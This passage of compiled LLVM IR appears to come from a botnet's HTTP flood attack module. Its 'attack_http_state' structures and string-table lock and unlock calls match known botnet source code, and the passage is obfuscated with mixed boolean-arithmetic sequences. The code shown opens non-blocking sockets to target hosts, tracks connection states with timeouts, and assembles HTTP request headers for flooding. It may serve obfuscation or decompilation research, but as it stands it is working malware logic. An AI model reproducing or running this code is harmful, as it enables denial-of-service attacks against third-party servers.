  %419 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %420 = load i32, i32* %9, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %419, i64 %421
  %423 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %422, i32 0, i32 5
  %424 = getelementptr inbounds [512 x i8], [512 x i8]* %423, i32 0, i32 0
  %425 = call i8* @table_retrieve_val(i32 60, i32* null)
  %426 = call i32 @util_strcpy(i8* %424, i8* %425)
  call void @table_lock_val(i8 zeroext 60)
  br label %436

; <label>:427:                                    ; preds = %298
  call void @table_unlock_val(i8 zeroext 61)
  %428 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i32 0, i32 5
  %433 = getelementptr inbounds [512 x i8], [512 x i8]* %432, i32 0, i32 0
  %434 = call i8* @table_retrieve_val(i32 61, i32* null)
  %435 = call i32 @util_strcpy(i8* %433, i8* %434)
  call void @table_lock_val(i8 zeroext 61)
  br label %436

; <label>:436:                                    ; preds = %427, %418, %409, %400, %391, %382, %373, %364, %355, %346, %337, %328, %319, %310, %301, %298
  %437 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %440, i32 0, i32 6
  %442 = getelementptr inbounds [257 x i8], [257 x i8]* %441, i32 0, i32 0
  %443 = load i8*, i8** %17, align 8
  %444 = call i32 @util_strcpy(i8* %442, i8* %443)
  br label %445

; <label>:445:                                    ; preds = %436
  %446 = load i32, i32* %9, align 4
  %447 = sub i32 0, 1
  %448 = sub i32 %446, %447
  %449 = add nsw i32 %446, 1
  store i32 %448, i32* %9, align 4
  br label %155

; <label>:450:                                    ; preds = %155
  br label %451

; <label>:451:                                    ; preds = %2897, %1156, %1146, %450
  store i32 0, i32* %23, align 4
  %452 = call i64 @time(i64* null) #6
  %453 = trunc i64 %452 to i32
  store i32 %453, i32* %27, align 4
  br label %454

; <label>:454:                                    ; preds = %451
  %455 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %456 = getelementptr inbounds [16 x i64], [16 x i64]* %455, i64 0, i64 0
  %457 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %456) #6, !srcloc !1
  %458 = extractvalue { i64, i64* } %457, 0
  %459 = extractvalue { i64, i64* } %457, 1
  %460 = trunc i64 %458 to i32
  store i32 %460, i32* %28, align 4
  %461 = ptrtoint i64* %459 to i64
  %462 = trunc i64 %461 to i32
  store i32 %462, i32* %29, align 4
  br label %463

; <label>:463:                                    ; preds = %454
  br label %464

; <label>:464:                                    ; preds = %463
  %465 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %466 = getelementptr inbounds [16 x i64], [16 x i64]* %465, i64 0, i64 0
  %467 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %466) #6, !srcloc !2
  %468 = extractvalue { i64, i64* } %467, 0
  %469 = extractvalue { i64, i64* } %467, 1
  %470 = trunc i64 %468 to i32
  store i32 %470, i32* %30, align 4
  %471 = ptrtoint i64* %469 to i64
  %472 = trunc i64 %471 to i32
  store i32 %472, i32* %31, align 4
  br label %473

; <label>:473:                                    ; preds = %464
  store i32 0, i32* %9, align 4
  br label %474

; <label>:474:                                    ; preds = %1137, %473
  %475 = load i32, i32* %9, align 4
  %476 = load i32, i32* %18, align 4
  %477 = icmp slt i32 %475, %476
  br i1 %477, label %478, label %1143

; <label>:478:                                    ; preds = %474
  %479 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %480 = load i32, i32* %9, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %479, i64 %481
  store %struct.attack_http_state* %482, %struct.attack_http_state** %26, align 8
  %483 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %484 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %483, i32 0, i32 1
  %485 = load i8, i8* %484, align 4
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 1
  br i1 %487, label %488, label %500

; <label>:488:                                    ; preds = %478
  %489 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %490 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %489, i32 0, i32 12
  %491 = load i32, i32* %490, align 4
  %492 = icmp ne i32 %491, 0
  br i1 %492, label %493, label %496

; <label>:493:                                    ; preds = %488
  %494 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %494, i32 0, i32 1
  store i8 4, i8* %495, align 4
  br label %499

; <label>:496:                                    ; preds = %488
  %497 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %497, i32 0, i32 1
  store i8 0, i8* %498, align 4
  br label %499

; <label>:499:                                    ; preds = %496, %493
  br label %500

; <label>:500:                                    ; preds = %499, %478
  %501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %501, i32 0, i32 1
  %503 = load i8, i8* %502, align 4
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 0
  br i1 %505, label %506, label %608

; <label>:506:                                    ; preds = %500
  %507 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %507, i8 0, i64 16, i32 4, i1 false)
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 0
  %510 = load i32, i32* %509, align 4
  %511 = icmp ne i32 %510, -1
  br i1 %511, label %512, label %517

; <label>:512:                                    ; preds = %506
  %513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %513, i32 0, i32 0
  %515 = load i32, i32* %514, align 4
  %516 = call i32 @close(i32 %515)
  br label %517

; <label>:517:                                    ; preds = %512, %506
  %518 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %519 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %520 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %519, i32 0, i32 0
  store i32 %518, i32* %520, align 4
  %521 = icmp eq i32 %518, -1
  br i1 %521, label %522, label %523

; <label>:522:                                    ; preds = %517
  br label %1137

; <label>:523:                                    ; preds = %517
  %524 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %525 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %524, i32 0, i32 0
  %526 = load i32, i32* %525, align 4
  %527 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %528 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %527, i32 0, i32 0
  %529 = load i32, i32* %528, align 4
  %530 = call i32 (i32, i32, ...) @fcntl(i32 %529, i32 3, i32 0)
  %531 = xor i32 2048, -1
  %532 = xor i32 %530, -1
  %533 = xor i32 -1272170861, -1
  %534 = and i32 %531, -1272170861
  %535 = and i32 2048, %533
  %536 = and i32 %532, -1272170861
  %537 = and i32 %530, %533
  %538 = or i32 %534, %535
  %539 = or i32 %536, %537
  %540 = xor i32 %538, %539
  %541 = or i32 %531, %532
  %542 = xor i32 %541, -1
  %543 = or i32 -1272170861, %533
  %544 = and i32 %542, %543
  %545 = or i32 %540, %544
  %546 = or i32 2048, %530
  %547 = call i32 (i32, i32, ...) @fcntl(i32 %526, i32 4, i32 %545)
  store i32 65535, i32* %10, align 4
  %548 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %548, i32 0, i32 0
  %550 = load i32, i32* %549, align 4
  %551 = bitcast i32* %10 to i8*
  %552 = call i32 @setsockopt(i32 %550, i32 0, i32 8, i8* %551, i32 4) #6
  %553 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %553, align 4
  %554 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %555 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %554, i32 0, i32 4
  %556 = load i32, i32* %555, align 4
  %557 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %558 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %557, i32 0, i32 0
  store i32 %556, i32* %558, align 4
  %559 = load i16, i16* %19, align 2
  %560 = call zeroext i16 @htons(i16 zeroext %559) #7
  %561 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %560, i16* %561, align 2
  %562 = load i32, i32* %27, align 4
  %563 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %564 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %563, i32 0, i32 2
  store i32 %562, i32* %564, align 4
  %565 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %566 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %565, i32 0, i32 1
  store i8 2, i8* %566, align 4
  %567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 4
  %570 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %571 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %571, %struct.sockaddr** %570, align 8
  %572 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %573 = load %struct.sockaddr*, %struct.sockaddr** %572, align 8
  %574 = call i32 @connect(i32 %569, %struct.sockaddr* %573, i32 16)
  %575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i32 0, i32 0
  %577 = load i32, i32* %576, align 4
  %578 = srem i32 %577, 64
  %579 = zext i32 %578 to i64
  %580 = shl i64 1, %579
  %581 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %582 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %583 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %582, i32 0, i32 0
  %584 = load i32, i32* %583, align 4
  %585 = sdiv i32 %584, 64
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds [16 x i64], [16 x i64]* %581, i64 0, i64 %586
  %588 = load i64, i64* %587, align 8
  %589 = and i64 %588, %580
  %590 = xor i64 %588, %580
  %591 = or i64 %589, %590
  %592 = or i64 %588, %580
  store i64 %591, i64* %587, align 8
  %593 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %594 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %593, i32 0, i32 0
  %595 = load i32, i32* %594, align 4
  %596 = load i32, i32* %23, align 4
  %597 = icmp sgt i32 %595, %596
  br i1 %597, label %598, label %607

; <label>:598:                                    ; preds = %523
  %599 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %600 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %599, i32 0, i32 0
  %601 = load i32, i32* %600, align 4
  %602 = sub i32 0, %601
  %603 = sub i32 0, 1
  %604 = add i32 %602, %603
  %605 = sub i32 0, %604
  %606 = add nsw i32 %601, 1
  store i32 %605, i32* %23, align 4
  br label %607

; <label>:607:                                    ; preds = %598, %523
  br label %1136

; <label>:608:                                    ; preds = %500
  %609 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %610 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %609, i32 0, i32 1
  %611 = load i8, i8* %610, align 4
  %612 = zext i8 %611 to i32
  %613 = icmp eq i32 %612, 2
  br i1 %613, label %614, label %665

; <label>:614:                                    ; preds = %608
  %615 = load i32, i32* %27, align 4
  %616 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %617 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %616, i32 0, i32 2
  %618 = load i32, i32* %617, align 4
  %619 = sub i32 0, %618
  %620 = add i32 %615, %619
  %621 = sub i32 %615, %618
  %622 = icmp ugt i32 %620, 30
  br i1 %622, label %623, label %632

; <label>:623:                                    ; preds = %614
  %624 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %625 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %624, i32 0, i32 1
  store i8 0, i8* %625, align 4
  %626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %626, i32 0, i32 0
  %628 = load i32, i32* %627, align 4
  %629 = call i32 @close(i32 %628)
  %630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %630, i32 0, i32 0
  store i32 -1, i32* %631, align 4
  br label %1137

; <label>:632:                                    ; preds = %614
  %633 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %634 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %633, i32 0, i32 0
  %635 = load i32, i32* %634, align 4
  %636 = srem i32 %635, 64
  %637 = zext i32 %636 to i64
  %638 = shl i64 1, %637
  %639 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %640, i32 0, i32 0
  %642 = load i32, i32* %641, align 4
  %643 = sdiv i32 %642, 64
  %644 = sext i32 %643 to i64
  %645 = getelementptr inbounds [16 x i64], [16 x i64]* %639, i64 0, i64 %644
  %646 = load i64, i64* %645, align 8
  %647 = and i64 %646, %638
  %648 = xor i64 %646, %638
  %649 = or i64 %647, %648
  %650 = or i64 %646, %638
  store i64 %649, i64* %645, align 8
  %651 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %652 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %651, i32 0, i32 0
  %653 = load i32, i32* %652, align 4
  %654 = load i32, i32* %23, align 4
  %655 = icmp sgt i32 %653, %654
  br i1 %655, label %656, label %664

; <label>:656:                                    ; preds = %632
  %657 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %658 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 4
  %660 = add i32 %659, 1169354021
  %661 = add i32 %660, 1
  %662 = sub i32 %661, 1169354021
  %663 = add nsw i32 %659, 1
  store i32 %662, i32* %23, align 4
  br label %664

; <label>:664:                                    ; preds = %656, %632
  br label %1135

; <label>:665:                                    ; preds = %608
  %666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %666, i32 0, i32 1
  %668 = load i8, i8* %667, align 4
  %669 = zext i8 %668 to i32
  %670 = icmp eq i32 %669, 4
  br i1 %670, label %671, label %965

; <label>:671:                                    ; preds = %665
  %672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %672, i32 0, i32 14
  store i32 -1, i32* %673, align 4
  %674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %674, i32 0, i32 11
  store i32 0, i32* %675, align 4
  %676 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %677 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %676, i32 0, i32 18
  %678 = getelementptr inbounds [1024 x i8], [1024 x i8]* %677, i32 0, i32 0
  call void @util_zero(i8* %678, i32 1024)
  %679 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %680 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %679, i32 0, i32 17
  store i32 0, i32* %680, align 4
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %681, i32 10240)
  %682 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %683 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %684 = call i32 @util_strlen(i8* %683)
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds i8, i8* %682, i64 %685
  %687 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %688 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %687, i32 0, i32 9
  %689 = getelementptr inbounds [9 x i8], [9 x i8]* %688, i32 0, i32 0
  %690 = call i32 @util_strcpy(i8* %686, i8* %689)
  %691 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %692 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %693 = call i32 @util_strlen(i8* %692)
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds i8, i8* %691, i64 %694
  %696 = call i32 @util_strcpy(i8* %695, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %697 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %698 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %699 = call i32 @util_strlen(i8* %698)
  %700 = sext i32 %699 to i64
  %701 = getelementptr inbounds i8, i8* %697, i64 %700
  %702 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %703 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %702, i32 0, i32 6
  %704 = getelementptr inbounds [257 x i8], [257 x i8]* %703, i32 0, i32 0
  %705 = call i32 @util_strcpy(i8* %701, i8* %704)
  %706 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %707 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %708 = call i32 @util_strlen(i8* %707)
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds i8, i8* %706, i64 %709
  %711 = call i32 @util_strcpy(i8* %710, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %712 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %713 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %714 = call i32 @util_strlen(i8* %713)
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds i8, i8* %712, i64 %715
  %717 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %718 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %717, i32 0, i32 5
  %719 = getelementptr inbounds [512 x i8], [512 x i8]* %718, i32 0, i32 0
  %720 = call i32 @util_strcpy(i8* %716, i8* %719)
  %721 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %722 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %723 = call i32 @util_strlen(i8* %722)
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds i8, i8* %721, i64 %724
  %726 = call i32 @util_strcpy(i8* %725, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %727 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %728 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %729 = call i32 @util_strlen(i8* %728)
  %730 = sext i32 %729 to i64
  %731 = getelementptr inbounds i8, i8* %727, i64 %730
  %732 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %733 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %732, i32 0, i32 7
  %734 = getelementptr inbounds [129 x i8], [129 x i8]* %733, i32 0, i32 0
  %735 = call i32 @util_strcpy(i8* %731, i8* %734)
  %736 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %737 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %738 = call i32 @util_strlen(i8* %737)
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds i8, i8* %736, i64 %739
  %741 = call i32 @util_strcpy(i8* %740, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 32)
  %742 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %743 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %744 = call i32 @util_strlen(i8* %743)
  %745 = sext i32 %744 to i64
  %746 = getelementptr inbounds i8, i8* %742, i64 %745
  %747 = call i8* @table_retrieve_val(i32 32, i32* null)
  %748 = call i32 @util_strcpy(i8* %746, i8* %747)
  call void @table_lock_val(i8 zeroext 32)
  %749 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %750 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %751 = call i32 @util_strlen(i8* %750)
  %752 = sext i32 %751 to i64
  %753 = getelementptr inbounds i8, i8* %749, i64 %752
  %754 = call i32 @util_strcpy(i8* %753, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 33)
  %755 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %756 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %757 = call i32 @util_strlen(i8* %756)
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds i8, i8* %755, i64 %758
  %760 = call i8* @table_retrieve_val(i32 33, i32* null)
  %761 = call i32 @util_strcpy(i8* %759, i8* %760)
  call void @table_lock_val(i8 zeroext 33)
  %762 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %763 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %764 = call i32 @util_strlen(i8* %763)
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds i8, i8* %762, i64 %765
  %767 = call i32 @util_strcpy(i8* %766, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 34)
  %768 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %769 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %770 = call i32 @util_strlen(i8* %769)
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds i8, i8* %768, i64 %771
  %773 = call i8* @table_retrieve_val(i32 34, i32* null)
  %774 = call i32 @util_strcpy(i8* %772, i8* %773)
  call void @table_lock_val(i8 zeroext 34)
  %775 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %776 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %777 = call i32 @util_strlen(i8* %776)
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds i8, i8* %775, i64 %778
  %780 = call i32 @util_strcpy(i8* %779, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %781 = load i8*, i8** %14, align 8
  %782 = icmp ne i8* %781, null
  br i1 %782, label %783, label %824

; <label>:783:                                    ; preds = %671
  call void @table_unlock_val(i8 zeroext 35)
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %786 = call i32 @util_strlen(i8* %785)
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %784, i64 %787
  %789 = call i8* @table_retrieve_val(i32 35, i32* null)
  %790 = call i32 @util_strcpy(i8* %788, i8* %789)
  call void @table_lock_val(i8 zeroext 35)
  %791 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %792 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %793 = call i32 @util_strlen(i8* %792)
  %794 = sext i32 %793 to i64
  %795 = getelementptr inbounds i8, i8* %791, i64 %794
  %796 = call i32 @util_strcpy(i8* %795, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %797 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %798 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %799 = call i32 @util_strlen(i8* %798)
  %800 = sext i32 %799 to i64
  %801 = getelementptr inbounds i8, i8* %797, i64 %800
  %802 = call i8* @table_retrieve_val(i32 40, i32* null)
  %803 = call i32 @util_strcpy(i8* %801, i8* %802)
  %804 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %805 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %806 = call i32 @util_strlen(i8* %805)
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds i8, i8* %804, i64 %807
  %809 = call i32 @util_strcpy(i8* %808, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %810 = load i8*, i8** %14, align 8
  %811 = call i32 @util_strlen(i8* %810)
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %814 = call i32 @util_strlen(i8* %813)
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds i8, i8* %812, i64 %815
  %817 = call i8* @util_itoa(i32 %811, i32 10, i8* %816)
  %818 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %819 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %820 = call i32 @util_strlen(i8* %819)
  %821 = sext i32 %820 to i64
  %822 = getelementptr inbounds i8, i8* %818, i64 %821
  %823 = call i32 @util_strcpy(i8* %822, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %824

; <label>:824:                                    ; preds = %783, %671
  %825 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %826 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %825, i32 0, i32 15
  %827 = load i32, i32* %826, align 4
  %828 = icmp sgt i32 %827, 0
  br i1 %828, label %829, label %873

; <label>:829:                                    ; preds = %824
  %830 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %831 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %832 = call i32 @util_strlen(i8* %831)
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds i8, i8* %830, i64 %833
  %835 = call i32 @util_strcpy(i8* %834, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %836

; <label>:836:                                    ; preds = %861, %829
  %837 = load i32, i32* %10, align 4
  %838 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %839 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %838, i32 0, i32 15
  %840 = load i32, i32* %839, align 4
  %841 = icmp slt i32 %837, %840
  br i1 %841, label %842, label %866

; <label>:842:                                    ; preds = %836
  %843 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %844 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %845 = call i32 @util_strlen(i8* %844)
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds i8, i8* %843, i64 %846
  %848 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %849 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %848, i32 0, i32 16
  %850 = load i32, i32* %10, align 4
  %851 = sext i32 %850 to i64
  %852 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %849, i64 0, i64 %851
  %853 = getelementptr inbounds [128 x i8], [128 x i8]* %852, i32 0, i32 0
  %854 = call i32 @util_strcpy(i8* %847, i8* %853)
  %855 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %856 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %857 = call i32 @util_strlen(i8* %856)
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds i8, i8* %855, i64 %858
  %860 = call i32 @util_strcpy(i8* %859, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %861

; <label>:861:                                    ; preds = %842
  %862 = load i32, i32* %10, align 4
  %863 = sub i32 0, 1
